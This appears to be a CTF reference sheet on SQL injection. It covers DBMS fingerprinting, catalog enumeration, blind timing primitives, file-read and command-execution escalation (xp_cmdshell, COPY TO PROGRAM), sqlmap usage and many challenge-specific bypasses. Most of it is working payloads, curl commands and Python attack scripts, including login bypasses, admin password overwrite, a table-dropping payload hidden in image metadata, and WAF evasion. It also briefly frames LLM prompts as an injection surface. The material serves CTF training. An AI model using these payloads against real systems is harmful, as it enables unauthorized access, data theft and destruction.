# CTF Web - SQL Injection Techniques

Comprehensive SQL injection techniques for CTF challenges. For other server-side attacks (SSTI, SSRF, XXE, command injection, GraphQL), see [server-side.md](server-side.md).

## 阶梯（按序试）

1. 闭合判型：数字 / 单引号 / 双引号 / 括号 —— 先让语法错误消失。 → 出口：三种引号都无报错差异，直接跳第 5 步。
2. `order by N` 猜列数，直到报错为止。 → 出口：`order by` 被过滤或列数无边界，跳第 5 步。
3. `union select` 找回显位：先全填 NULL，再逐列换成数据。 → 出口：找不到回显位，直接跳第 5 步。
4. 取库 → 取表 → 取列 → 取行（`information_schema` 或等价物）。 → 出口：`information_schema` 被禁就换等价表（`innodb_table_stats` / `sqlite_master`），仍不行跳第 5 步。
5. 无回显：布尔三态计数，或时间盲注（`sleep` / 重查询）。 → 出口：盲注测不动就回第 6 步绕 WAF，再从第 2 步重跑。
6. WAF 在挡：注释符拆分、大小写混写、二次 URL 编码。 → 出口：绕过后回到被挡的那一步（第 3/4 步）重试；绕不过就换注入点。

## Table of Contents
- [Identify the DBMS First](#identify-the-dbms-first)
- [Per-DBMS Enumeration Catalog](#per-dbms-enumeration-catalog)
- [Per-DBMS Blind Timing Primitives](#per-dbms-blind-timing-primitives)
- [Per-DBMS File Read and Code Execution Primitives](#per-dbms-file-read-and-code-execution-primitives)
- [sqlmap Headless Card](#sqlmap-headless-card)
- [Where Tools Fall Short](#where-tools-fall-short)
- [Backslash Escape Quote Bypass](#backslash-escape-quote-bypass)
- [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
- [Second-Order SQL Injection](#second-order-sql-injection)
- [SQLi LIKE Character Brute-Force](#sqli-like-character-brute-force)
- [MySQL Column Truncation (VolgaCTF 2014)](#mysql-column-truncation-volgactf-2014)
- [SQLi to SSTI Chain](#sqli-to-ssti-chain)
- [MySQL information_schema.processList Trick](#mysql-information_schemaprocesslist-trick)
- [WAF Bypass via XML Entity Encoding (Crypto-Cat)](#waf-bypass-via-xml-entity-encoding-crypto-cat)
- [SQLi via EXIF Metadata Injection (29c3 CTF 2012)](#sqli-via-exif-metadata-injection-29c3-ctf-2012)
- [Shift-JIS Encoding SQL Injection (Boston Key Party 2016)](#shift-jis-encoding-sql-injection-boston-key-party-2016)
- [SQL Injection via QR Code Input (H4ckIT CTF 2016)](#sql-injection-via-qr-code-input-h4ckit-ctf-2016)
- [SQL Double-Keyword Filter Bypass (DefCamp CTF 2016)](#sql-double-keyword-filter-bypass-defcamp-ctf-2016)
- [MySQL Session Variable for Dual-Value Injection (MeePwn CTF 2017)](#mysql-session-variable-for-dual-value-injection-meepwn-ctf-2017)
- [PHP PCRE Backtrack Limit WAF Bypass (SECUINSIDE 2017)](#php-pcre-backtrack-limit-waf-bypass-secuinside-2017)
- [information_schema.processlist Race Condition Leak (SECUINSIDE 2017)](#information_schemaprocesslist-race-condition-leak-secuinside-2017)
- [SQL BETWEEN Operator Tautology Bypass (DefCamp 2017)](#sql-between-operator-tautology-bypass-defcamp-2017)
- [Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017, MySQL ≤5.7 / MariaDB only)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017-mysql-57--mariadb-only)
- [SQLite Blind SQLi via randomblob() Timing (SECCON 2017)](#sqlite-blind-sqli-via-randomblob-timing-seccon-2017)
- [vsprintf Double-Prepare Format String SQLi (AceBear 2018)](#vsprintf-double-prepare-format-string-sqli-acebear-2018)
- [SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)](#sql-insert-on-duplicate-key-update-password-overwrite-midnight-sun-ctf-2018)
- [MySQL innodb_table_stats as information_schema Alternative (N1CTF 2018)](#mysql-innodb_table_stats-as-information_schema-alternative-n1ctf-2018)
- [SQLi Inline Comment Multi-Field Split (picoCTF 2018)](#sqli-inline-comment-multi-field-split-picoctf-2018)
- [PHP Full-Width Dollar Regex Anchor Bypass (Hack.lu CTF 2018)](#php-full-width-dollar-regex-anchor-bypass-hacklu-ctf-2018)
- [MySQL REGEXP Byte-by-Byte Oracle + Backtick Comment Bypass (BSides Delhi 2018)](#mysql-regexp-byte-by-byte-oracle--backtick-comment-bypass-bsides-delhi-2018)
- [LDAP Filter Breakout with Wildcard Injection (CSAW 2018)](#ldap-filter-breakout-with-wildcard-injection-csaw-2018)
- [ExpressionEngine FileManager ORDER BY Sort-Key SQLi (35C3 2018)](#expressionengine-filemanager-order-by-sort-key-sqli-35c3-2018)
- [PHP parse_str() Variable Injection (TokyoWesterns 2018)](#php-parse_str-variable-injection-tokyowesterns-2018)
- [SQLite UNION via X-Forwarded-For with PHPSESSID Oracle (NCSC 2019)](#sqlite-union-via-x-forwarded-for-with-phpsessid-oracle-ncsc-2019)
- [Quote-Adjacent UNION Keyword Filter Bypass (TAMUctf 2019)](#quote-adjacent-union-keyword-filter-bypass-tamuctf-2019)

---

## Identify the DBMS First

Ladder steps 1-3 (close the query, `order by`, `union select`) are engine-agnostic.
Steps 4-5 diverge: the enumeration catalog and the blind primitives are per-DBMS.
Fingerprint **before** burning requests on the wrong dialect - one error message or
one version probe settles it.

**Error-string fingerprints** (trigger with a stray quote; read the page body or the
debug log):

| DBMS | Distinctive error snippet |
|---|---|
| MySQL | `You have an error in your SQL syntax ... near` |
| PostgreSQL | `ERROR: syntax error at or near` |
| SQLite | `SQLITE_ERROR: unrecognized token:` |
| MSSQL | `Unclosed quotation mark after the character string` |
| Oracle | `ORA-01756: quoted string not properly terminated` |

**Version probes** (inside a working UNION):

```sql
' UNION SELECT @@version-- -                                -- MySQL, MSSQL
' UNION SELECT version()-- -                                -- PostgreSQL
' UNION SELECT sqlite_version()-- -                         -- SQLite
' UNION SELECT banner FROM v$version WHERE ROWNUM=1-- -     -- Oracle
```

**Shape probes** when errors are hidden - the dialect leaks through what parses:

- Comments: `#` is MySQL-only. `--` works everywhere but needs a trailing space or
  dash on MySQL only.
- Concatenation: `'a'||'b'` yields `ab` on PostgreSQL/Oracle/SQLite (on default MySQL
  it is a logical OR); MySQL wants `CONCAT('a','b')`; MSSQL wants `'a'+'b'`.
- Identifier case: Oracle folds unquoted identifiers to UPPERCASE - lowercase guesses
  return `ORA-00942: table or view does not exist`; uppercase or quote them.

**Exit:** name the DBMS (or the top-1 candidate) before choosing an enumeration path.

---

## Per-DBMS Enumeration Catalog

Step 4 (取库) of the ladder is `information_schema` on MySQL. Every engine answers the
same three questions (databases, tables, columns) from its own catalog:

- **MySQL**: `information_schema.schemata` -> `.tables WHERE table_schema=<db>` ->
  `.columns WHERE table_name=<t>`. If `information_schema` is filtered, fall back to
  `mysql.innodb_table_stats` (see the N1CTF 2018 innodb_table_stats entry below).
- **PostgreSQL**: `pg_tables` / `pg_indexes` for tables; columns via
  `pg_attribute WHERE attrelid='<t>'::regclass` (attname, attnum); other database
  names via `pg_database` (datname).
- **SQLite**: one file = one database; no cross-database catalog. `sqlite_master`
  (name, sql) is the fastest column source - the stored `CREATE TABLE` sql names every
  column at once (worked case: the NCSC 2019 X-Forwarded-For UNION entry below).
  `SELECT name FROM pragma_table_info('<t>')` lists columns too (verified locally:
  one row per column with name and type).
- **MSSQL**: `master..sysdatabases` for databases; `sysobjects WHERE xtype='U'` for
  tables in the current database; `syscolumns WHERE id=OBJECT_ID('<t>')` for columns.
- **Oracle**: `all_users` / `all_tables` / `all_tab_columns`; every unquoted identifier
  is UPPERCASE (see the shape probe above).

**Exit:** table and column names in hand for the fingerprinted engine - or a proven
filtered catalog, in which case switch to the blind ladder (step 5).

---

## Per-DBMS Blind Timing Primitives

Step 5 (盲注) of the ladder assumes MySQL `sleep()`. Other engines burn time their own
way - and one of them (MSSQL) needs statement stacking first.

**Baseline first, all engines:** time 2-3 requests you know are false, then 2-3 you
know are true, before extracting anything. CTF boxes carry 1-3s network noise; a
condition only counts when the *flipped* condition flips the delay. Re-confirm before
every extraction run.

- **MySQL**: `' AND IF(<cond>, SLEEP(3), 0)-- -`; if `SLEEP` is filtered,
  `BENCHMARK(50000000, MD5('x'))` burns comparable CPU; wide `information_schema`
  cross-joins amplify any delay (see the processList / processlist race entries).
- **PostgreSQL**: single statement, no stacking needed:
  `' AND (SELECT 1 FROM pg_sleep(CASE WHEN (<cond>) THEN 3 ELSE 0 END))=1-- -` -
  `pg_sleep` returns void, but any function is legal as a FROM item (one row, unused
  column), so the scalar subquery parses and the condition picks the delay. Probe it
  once with a known-true condition before extracting. If the FROM form is blocked,
  fall back to stacked `'; SELECT CASE WHEN (<cond>) THEN pg_sleep(3) ELSE pg_sleep(0)
  END-- -`, then to a boolean oracle: `AND 1=(CASE WHEN (<cond>) THEN 1 ELSE 0 END)`
  and diff the response content.
- **SQLite**: no sleep - burn CPU. `CASE WHEN (<cond>) THEN length(randomblob(30000000))
  ELSE 0 END`: 30M random bytes cost ~0.3-0.5s on commodity cores (verified locally);
  scale N until it clears the noise floor. A recursive CTE counting to 3M runs ~0.5s
  (verified locally). Single query, no stacking. Worked case: the SECCON 2017
  randomblob timing entry below.
- **MSSQL**: `'; IF (<cond>) WAITFOR DELAY '0:0:3'-- -` - statement stacking required
  (`WAITFOR` cannot appear inside a subquery) - the only engine here that needs it.
- **Oracle**: no SELECT-level sleep. `DBMS_LOCK.SLEEP` needs DBA; the reachable
  primitive is `DBMS_PIPE.RECEIVE_MESSAGE`. `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a', 3)-- -`
  sleeps unconditionally (use it as the baseline sanity check); the conditional form is
  `' AND CASE WHEN (<cond>) THEN DBMS_PIPE.RECEIVE_MESSAGE('a', 3) ELSE 0 END=0-- -`.
- **MongoDB** (operator injection, not SQL): `$where` busy-loop or `$function` timing -
  see server-side-advanced-4.md (MongoDB Regex Injection / $where Blind Oracle,
  Nullcon 2026).

**Cost discipline:** extract the length first (binary search over 0..max, ~7 timed
requests), then per character binary-search the charset (~7 requests per char). Never
linear-scan a charset: even 70 requests x 3s each already costs ~3.5 minutes, and a
full per-character linear sweep over the charset scales into hours.

**Exit:** one boolean reproducibly encoded into a >=2s delay delta (or a stable boolean
diff) on the fingerprinted engine.

---

## Per-DBMS File Read and Code Execution Primitives

Post-enumeration escalation per engine. All of these need elevated database rights -
probe for the privilege, never assume it.

- **MySQL**: `load_file('/etc/passwd')` is gated by `@@secure_file_priv` - read it in
  your UNION first: `NULL` = feature disabled, empty string = any path, a path = only
  under that directory (packaged builds commonly ship a path such as
  `/var/lib/mysql-files`, not `NULL`). `INTO OUTFILE` additionally needs the `FILE`
  privilege and an *empty* `secure_file_priv` - rare in packaged builds, so treat file
  write as a dead end until you have read the variable and it says otherwise.
- **PostgreSQL** (superuser): `pg_read_file('/etc/passwd')` reads;
  `COPY (SELECT '') TO PROGRAM 'id > /tmp/p'` executes shell commands. CTF networks
  give no outbound observer - prove RCE by reading its output back through SQL
  (`pg_read_file('/tmp/p')` inside your next UNION).
- **SQLite**: `ATTACH DATABASE '/var/www/html/x.php' AS p` writes an arbitrary *empty*
  file in one statement (path traversal marker, log-poisoning pivot). A full file write
  (webshell) needs multi-statement execution on the app side (PDO::exec, sqlite3::exec)
  - probe whether the stack tolerates `;` before investing (see the NCSC 2019 SQLite
  UNION entry for what one statement can do).
- **MSSQL** (sysadmin + stacked queries):

  ```sql
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
  ```

- **Oracle**: no practical file-read or RCE primitive reachable from injection - stay
  on UNION / error-based extraction.

**Exit:** file read proven (or firmly ruled out, with the reason); claim RCE only after
reading its output back through SQL.

---

## sqlmap Headless Card

sqlmap ships in the image (Debian package). It is a bulk tool: aim it at one parameter,
read the markers, move on. Runtime truth beats memory - this build may ship fewer
tamper scripts than upstream docs list:

```bash
sqlmap --version && sqlmap --list-tampers   # what THIS image actually ships
sqlmap -u "http://target:8000/item?id=1" -p id --batch --dbms=MySQL --technique=BEU --level=1 --risk=1
sqlmap -r request.txt -p id --batch --flush-session    # replay a captured request byte-exactly
```

Discipline:

- **One parameter at a time** (`-p id`). Full-form scans waste turns and hit stateful
  endpoints with junk; `-r request.txt` replays the captured request exactly (auth
  cookies, JSON bodies, odd content-types included).
- **`--batch` always** (headless - never prompt); **`--flush-session`** after ANY
  change to target, parameter, or technique - cached session data poisons re-runs.
- **`--technique=BEUST`**: B boolean, E error, U union, S stacked, T time. Start with
  `BEU`; reach for `T` only when nothing fires - time-based extraction pays seconds
  per request.
- **`--level`**: 1 = URL/body, 2 = +Cookie, 3 = +UA/Referer. Header injection is often
  faster hand-crafted than a level-3 sweep (the NCSC 2019 XFF UNION case is one
  manual request).
- **`--risk`**: keep 1-2 on stateful targets; `--risk=3` adds OR-based and
  UPDATE-heavy payloads that can rewrite rows you cannot restore.
- **Boolean oracle flags** when the true/false page diff is subtle: `--string` /
  `--not-string` (response markers), `--regexp`, `--code`.
- **Judge by stdout markers, not exit codes**: success prints
  `identified the following injection point`; a clean miss prints
  `all tested parameters do not appear to be injectable`. Disk evidence lands in
  `~/.local/share/sqlmap/output/<host>/`; add `-t traffic.log` to capture the exact
  requests for later manual replay.
- **Blocked by a WAF?** Apply the tamper-equivalent transforms by hand - space to
  `/**/`, `=` to `LIKE`, case shuffle, double URL-encode. If you do reach for tampers,
  add ONE at a time and re-test: a stack of tampers hides which one broke the syntax.
- **When manual wins outright**: second-order (inject on page A, read on page B),
  JSON bodies with nested syntax quirks, parameters sqlmap refuses to test, and any
  injection whose shape you already know - a hand-built UNION is one request where
  sqlmap burns dozens.

**Exit:** injection point confirmed (stdout marker + saved request), or a recorded
miss with the reason the manual path takes over.

---

## Where Tools Fall Short

Gaps the ladder + sqlmap combination does not cover; each has a manual recipe:

- **Second-order injection**: the payload is stored via page A and executes in a query
  on page B. sqlmap tests one request-response pair; carry the payload across pages
  yourself (see [Second-Order SQL Injection](#second-order-sql-injection)).
- **PDO emulated prepares**: with `ATTR_EMULATE_PREPARES` on, binding happens
  client-side and charset confusion can un-escape quotes. If a quote survives in one
  charset, replay the payload under a different `SET NAMES` charset.
- **JSON-syntax asymmetry**: filters that regex the raw body miss SQL syntax hidden
  inside JSON strings, and vice versa. If form-encoded is blocked, re-send the same
  parameter as JSON (`Content-Type: application/json`) before concluding "filtered".
- **Header-vs-body parsing differences**: WAF rules often inspect the body but not
  UA / Referer / X-Forwarded-For, or URL-decode one surface and not the other. That is
  the `--level=3` surface - and manual header injection is usually faster.
- **Natural-language and tool-call surfaces**: text-to-SQL apps and LLM tool calls
  assemble SQL from prose - treat the prompt itself as the injection parameter and
  attack it as prompt injection; this pack does not catalog that surface - for LLM
  jailbreak worked cases see auth-and-access.md.

---

## Backslash Escape Quote Bypass
```bash
# Query: SELECT * FROM users WHERE username='$user' AND password='$pass'
# With username=\ : WHERE username='\' AND password='...'
curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
```

## Hex Encoding for Quote Bypass
```sql
SELECT 0x6d656f77;  -- Returns 'meow'
-- Combined with UNION for SSTI injection:
username=asd\&password=) union select 1, 0x7b7b73656c662e5f5f696e69745f5f7d7d#
```

## Second-Order SQL Injection
**Pattern (Second Breakfast):** Inject SQL in username during registration, triggers on profile view.
1. Register with malicious username: `' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a`
2. Login normally
3. View profile → injected SQL executes in query using stored username

```python
import requests

s = requests.Session()

# Step 1: Store malicious payload (safely escaped during INSERT)
s.post("https://target.com/register", data={
    "username": "admin'-- -",
    "password": "anything"
})

# Step 2: Trigger — payload retrieved from DB and used unsafely
# Common triggers: password change, profile update, search using stored value
s.post("https://target.com/change-password", data={
    "old_password": "anything",
    "new_password": "hacked"
})
# UPDATE users SET password='hacked' WHERE username='admin'-- -'
# Result: admin password changed
```

**Key insight:** Second-order SQLi occurs when input is safely stored but later retrieved and used in a new query without escaping. Look for registration→profile update flows, stored preferences used in queries, or any feature that reads back user-controlled data from the database.

## SQLi LIKE Character Brute-Force
```python
password = ""
for pos in range(length):
    for c in string.printable:
        payload = f"' OR password LIKE '{password}{c}%' --"
        if oracle(payload):
            password += c; break
```

## MySQL Column Truncation (VolgaCTF 2014)

**Pattern:** Registration form backed by MySQL `VARCHAR(N)` on a **PAD SPACE collation** - true for utf8mb4_general_ci / latin1_swedish_ci and most pre-8.0 defaults, false for MySQL 8's default utf8mb4_0900_* family (NO PAD). MySQL silently truncates strings longer than N characters only under a **non-strict `sql_mode`** (strict mode, the 5.7+/8.0 default, rejects the oversized INSERT with error 1406 instead), and PAD SPACE collations ignore trailing spaces in string comparison. Gate first via the same injection (`UNION SELECT @@version` / `@@sql_mode` / `@@collation_connection`): on 5.7+/8.0 defaults (strict mode; NO PAD from 8.0 on) this trick is dead - do not burn requests on it. Register as `"admin" + spaces + junk` to create a duplicate "admin" row with an attacker-controlled password.

```bash
# VARCHAR(20) column — pad "admin" (5 chars) to exceed column width
# MySQL truncates to "admin               " → matches "admin" in comparisons

# Register duplicate admin with attacker password
curl -X POST http://target/register -d \
  'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=attacker123'

# Login as admin with attacker password
curl -X POST http://target/login -d 'login=admin&password=attacker123'
```

**Why it works:**
1. MySQL `VARCHAR(N)` truncates input to N characters on INSERT - non-strict `sql_mode` only; strict mode (5.7+ default) raises error 1406 instead
2. MySQL ignores trailing spaces in `=` comparisons (SQL standard PAD SPACE behavior)
3. `"admin" + 50 spaces + "x"` truncates to `"admin" + spaces` → matches `"admin"`
4. The application now has two rows matching "admin" — the original and the attacker's

**Key insight:** MySQL's PAD SPACE collation means `"admin" = "admin     "` evaluates to true. Combined with silent `VARCHAR` truncation, registering with a space-padded username creates a second account that the application treats as the original admin. This bypasses registration duplicate checks that use `WHERE username = ?` (since the padded version isn't an exact match before truncation). Fixed in MySQL 8.0+ with `NO_PAD` collations.

## SQLi to SSTI Chain
When SQLi result gets rendered in a template:
```python
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
hex_payload = '0x' + payload.encode().hex()
# Final: username=x\&password=) union select 1, {hex_payload}#
```

## MySQL information_schema.processList Trick
```sql
SELECT info FROM information_schema.processList WHERE id=connection_id()
SELECT substring(info, 315, 579) FROM information_schema.processList WHERE id=connection_id()
```

## WAF Bypass via XML Entity Encoding (Crypto-Cat)
When SQL keywords (`UNION`, `SELECT`) are blocked by a WAF, encode them as XML hex character references. The XML parser decodes entities before the SQL engine processes the query:
```xml
<storeId>
  1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users
</storeId>
```
This decodes to `1 UNION SELECT username FROM users` after XML processing.

**Encoding reference:**
| Keyword | XML Hex Entities |
|---------|-----------------|
| UNION | `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` |
| SELECT | `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;` |
| FROM | `&#x46;&#x52;&#x4f;&#x4d;` |
| WHERE | `&#x57;&#x48;&#x45;&#x52;&#x45;` |

**Key insight:** WAF inspects raw XML bytes and blocks keyword patterns, but the XML parser decodes `&#xNN;` entities before passing values to the SQL layer. Any endpoint accepting XML input (SOAP, REST with XML body, stock check APIs) is a candidate.

**With sqlmap:** Use the `hexentities` tamper script. To prevent `&amp;` double-encoding of entities, modify `sqlmap/lib/request/connect.py`.

## SQLi via EXIF Metadata Injection (29c3 CTF 2012)

**Pattern:** Application extracts EXIF metadata from uploaded images (e.g., Comment, Artist, Description, Copyright) and inserts the values into SQL queries without sanitization. SQL payloads embedded in EXIF fields bypass WAFs that only inspect HTTP request bodies and URL parameters.

**Injecting SQL into EXIF fields:**
```bash
# Set EXIF Comment field to SQL payload
exiftool -Comment="' UNION SELECT password FROM users--" image.jpg

# Other injectable EXIF fields
exiftool -Artist="' OR 1=1--" image.jpg
exiftool -ImageDescription="'; DROP TABLE uploads;--" image.jpg
exiftool -Copyright="' UNION SELECT flag FROM flags--" image.jpg

# XMP metadata (often parsed by web applications)
exiftool -XMP-dc:Description="' UNION SELECT 1,2,3--" image.jpg
```

**Key insight:** Image galleries, photo management apps, and any upload endpoint that stores or displays EXIF data may feed metadata directly into SQL queries. WAFs and input filters typically inspect form fields and URL parameters but not binary file content. The EXIF fields survive re-encoding unless the application explicitly strips metadata (e.g., with `exiftool -all=`).

**Detection:** Upload endpoint that displays metadata (camera model, description, location) after upload. Check if special characters in EXIF fields cause SQL errors in the response.

## Shift-JIS Encoding SQL Injection (Boston Key Party 2016)

Multi-byte encoding mismatch bypasses escape functions. The yen sign (`\u00a5`) maps to backslash `0x5c` in Shift-JIS. A custom escape function adds backslash after yen, but in Shift-JIS context `\u00a5\` becomes `\\`, leaving the quote unescaped:

```javascript
socket.send('{"type":"get_answer","answer":"\\u00a5\\" OR 1=1 -- "}')
```

**Key insight:** Charset mismatch between escaping layer (Unicode) and database layer (Shift-JIS) defeats custom escape routines. Look for applications using non-UTF-8 character encodings (Shift-JIS, EUC-JP, GBK) where multi-byte characters contain `0x5c` (backslash) as a trailing byte.

## SQL Injection via QR Code Input (H4ckIT CTF 2016)

Applications that decode QR codes and use the contents in SQL queries create an injection vector through the QR image itself.

```python
import qrcode
import base64
import requests

# Generate QR code containing SQL injection payload
# Spaces may be filtered - use tabs instead
payload = "'\tunion\tselect\tsecret_field\tfrom\tmessages\twhere\tsecret_field\tlike\t'%flag%"

# Some apps use reversed base64: encode, reverse, then QR-encode
encoded = base64.b64encode(payload.encode()).decode().strip()
# reversed_encoded = encoded[::-1]  # if app reverses base64

# Generate QR code image
img = qrcode.make(payload)
img.save("sqli_qr.png")

# Upload QR code to target application
files = {'qr': open('sqli_qr.png', 'rb')}
r = requests.post('http://target/scan', files=files)
```

**Key insight:** QR codes are often trusted as "safe" input. When decoded QR content flows into SQL queries, standard SQLi techniques apply but with tab characters (`\t`) replacing spaces when space filtering is active. The QR encoding adds an obfuscation layer that may bypass WAFs.

## SQL Double-Keyword Filter Bypass (DefCamp CTF 2016)

Bypass SQL keyword filters that perform single-pass removal by nesting the keyword inside itself, so removal reveals the original keyword.

```text
# Filter removes "select" once from input
# Payload: sselectelect -> after removal -> select

# Full injection with nested keywords:
), ((selselectect * frofromm (seselectlect load_load_filefile('/flag')) as a limit 0, 1), '2') #

# Common nested bypass patterns:
# "select" blocked: sselectelect, seLselectECT
# "union"  blocked: ununionion
# "from"   blocked: frofromm
# "where"  blocked: whewherere
# "load_file" blocked: load_load_filefile
# "and"    blocked: aandnd
# "or"     blocked: oorr
```

**Key insight:** Single-pass keyword filters that replace/remove SQL keywords once are trivially bypassed by embedding the keyword within itself. The outer characters survive removal, reconstructing the forbidden keyword. Always test if the filter runs iteratively or just once.

## MySQL Session Variable for Dual-Value Injection (MeePwn CTF 2017)

When the same SQL parameter is evaluated in two sequential queries within a single database connection, MySQL session variables (`@var:=`) can return different values on each evaluation.

```sql
-- First eval returns 2, second returns 1
case when @wurst is null then @wurst:=2 else @wurst:=@wurst-1 end
```

**Example scenario:**
```sql
-- Application runs two queries with the same injected parameter:
-- Query 1: SELECT * FROM users WHERE role = [INJECTION]
-- Query 2: INSERT INTO log (action) VALUES ([INJECTION])
-- Need role=2 for admin in Query 1, but action=1 to avoid alert in Query 2

-- Injection:
' OR role = (case when @w is null then @w:=2 else @w:=@w-1 end) --
```

**Key insight:** Session variables persist across queries within a connection. Using `CASE WHEN @var IS NULL` initializes on first use and mutates on subsequent uses, allowing a single injection point to satisfy different conditions in sequential queries. This is useful when the same user input is interpolated into multiple SQL statements executed in sequence.

## PHP PCRE Backtrack Limit WAF Bypass (SECUINSIDE 2017)

PHP's `preg_match()` silently returns `false` (not `0`) when the PCRE backtrack limit is exceeded. Appending 1M+ characters to input forces backtracking beyond the default limit (1,000,000), causing the regex to fail to match.

```python
# Bypass preg_match WAF by exceeding backtrack limit
payload = "union select 1,2,3-- " + "a" * 1000001
# preg_match returns false (error) instead of 0 (no match)
# Most PHP code checks: if (!preg_match(...)) { allow; }
```

```php
// Vulnerable WAF pattern:
if (!preg_match('/union|select|from/i', $_GET['input'])) {
    // preg_match returns false on backtrack overflow
    // !false === true → WAF bypassed
    $result = mysql_query("SELECT * FROM data WHERE id = " . $_GET['input']);
}
```

**Key insight:** PHP's PCRE backtrack limit (`pcre.backtrack_limit`, default 1M) causes `preg_match()` to return `false` on overflow, which many WAFs treat as "no match" due to loose comparison (`!false == true`). The fix is to check `preg_match() === 0` (strict comparison) rather than `!preg_match()`. This works against any regex-based WAF in PHP that uses loose comparison on the return value.

## information_schema.processlist Race Condition Leak (SECUINSIDE 2017)

Race SQL injection against concurrent requests to leak data from `information_schema.processlist`, which shows currently executing queries including sensitive values like encryption keys.

```sql
-- Leak AES key from concurrent query via processlist
union select 1,(select INFO from information_schema.processlist
  where INFO like 0x256465637279707425),3,4 from board
-- The '%decrypt%' hex pattern matches the concurrent query containing the key
```

```python
import requests
import threading

# Race condition: fire injection while the app is running a sensitive query
def trigger_sensitive_query():
    """Application query that contains the AES key"""
    requests.get("http://target/decrypt?data=encrypted_blob")

def leak_processlist():
    """Injection that reads from processlist"""
    payload = "1 union select 1,(select INFO from information_schema.processlist where INFO like 0x256465637279707425),3,4-- "
    r = requests.get(f"http://target/search?id={payload}")
    if "AES_DECRYPT" in r.text:
        print(f"Leaked: {r.text}")

# Fire both concurrently
for _ in range(100):
    t1 = threading.Thread(target=trigger_sensitive_query)
    t2 = threading.Thread(target=leak_processlist)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
```

**Key insight:** `information_schema.processlist.INFO` exposes the full SQL text of all currently running queries on the MySQL server. By racing an injection query against a concurrent application query that references secrets, those secrets can be captured from the process list. This extends the existing `information_schema.processList` trick by adding a timing/race component to capture transient queries that contain secrets (encryption keys, passwords) only visible during execution.

---

## SQL BETWEEN Operator Tautology Bypass (DefCamp 2017)

**Pattern:** When a WAF blocks comparison operators (`=`, `<`, `>`) and numeric literals, use `id BETWEEN id AND id` as a tautology. Both bounds are column references (not filtered literals), and the expression is always true since a value is always between itself and itself.

```sql
-- Blocked by WAF: digits and comparison operators filtered
-- id=1 → blocked, id>0 → blocked, 1=1 → blocked

-- BETWEEN with column names as bounds (always true):
id BETWEEN id AND id           -- semantically: id <= id AND id >= id → always true

-- Full bypass with UNION:
' OR id BETWEEN id AND id UNION SELECT flag,2,3 FROM flags--

-- When even UNION is blocked, use with conditional:
id BETWEEN id AND id AND (SELECT SUBSTR(flag,1,1) FROM flags) BETWEEN 'a' AND 'z'
```

```python
import requests

def sqli_between(position, low_char, high_char):
    """Binary search using BETWEEN for character-by-character extraction."""
    payload = (
        f"' OR id BETWEEN id AND id "
        f"AND SUBSTR((SELECT flag FROM flags LIMIT 1),{position},1) "
        f"BETWEEN '{low_char}' AND '{high_char}'-- "
    )
    r = requests.get("http://target/item", params={"id": payload})
    return "result" in r.text   # truthy response = condition matched
```

**Combining with schema enumeration when `information_schema` is blocked:**
```sql
-- PROCEDURE ANALYSE() as alternative on MySQL ≤5.7 / MariaDB (see next technique)
SELECT * FROM users WHERE id BETWEEN id AND id PROCEDURE ANALYSE()
```

**Key insight:** SQL `BETWEEN col AND col` with the same column as both bounds is semantically a tautology but syntactically avoids digit and comparison operator signatures. Combine with string column references for blind extraction when numeric literals and `=`/`<`/`>` are filtered.

---

## Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017, MySQL ≤5.7 / MariaDB only)

**Pattern:** The HTTP `Host` header is used in a SQL query (e.g., to log access or resolve virtual hosts) without sanitization. Since Host is rarely tested by WAFs, standard injection techniques work. When `information_schema` is blocked, MySQL's `PROCEDURE ANALYSE()` provides table and column enumeration (MySQL ≤5.7 / MariaDB only — removed in MySQL 8.0.1).

```bash
# Test: inject into Host header
curl -H "Host: ' OR '1'='1'--" http://target/
# If response differs → Host header is injected into SQL

# UNION injection via Host header:
curl -H "Host: ' UNION SELECT table_name,2,3 FROM information_schema.tables-- " http://target/

# When information_schema is blocked, append PROCEDURE ANALYSE() to the running query:
curl -H "Host: ' PROCEDURE ANALYSE()-- " http://target/
# PROCEDURE ANALYSE() analyses the result set and returns column metadata, leaking column names
```

```python
import requests

TARGET = "http://target/"

def host_sqli(payload):
    r = requests.get(TARGET, headers={"Host": payload})
    return r.text

# Enumerate columns via PROCEDURE ANALYSE() when information_schema blocked:
# No UNION column-count matching needed — it analyses the app query's own result set
result = host_sqli("' PROCEDURE ANALYSE()-- ")
print(result)

# PROCEDURE ANALYSE() output includes: field names, min/max values, optimal data type
# This leaks column names, row counts, and sample values
```

**PROCEDURE ANALYSE() output structure:**
```sql
-- Returns rows like:
-- Field_name: database.table.column
-- Min_value / Max_value: actual data ranges
-- Optimal_fieldtype: suggested column type
-- The "Field_name" column leaks fully qualified column names: db.table.column
```

**Other Host header injection vectors:**
```text
X-Forwarded-For      # logged to DB as client IP
X-Real-IP            # same
User-Agent           # logged for analytics
Referer              # logged for referral tracking
```

**Key insight:** `PROCEDURE ANALYSE()` is a legacy (MySQL ≤5.7 / MariaDB only, removed in MySQL 8.0.1) alternative to `information_schema` for schema enumeration — it analyzes the result set and returns column metadata. On MySQL 8+, use `mysql.innodb_table_stats` instead (see "MySQL innodb_table_stats as information_schema Alternative" below). Host header injection is often overlooked by WAFs and developers because it's not a typical user input field, yet it frequently flows into SQL queries for logging, virtual hosting, or analytics.

---

## SQLite Blind SQLi via randomblob() Timing (SECCON 2017)

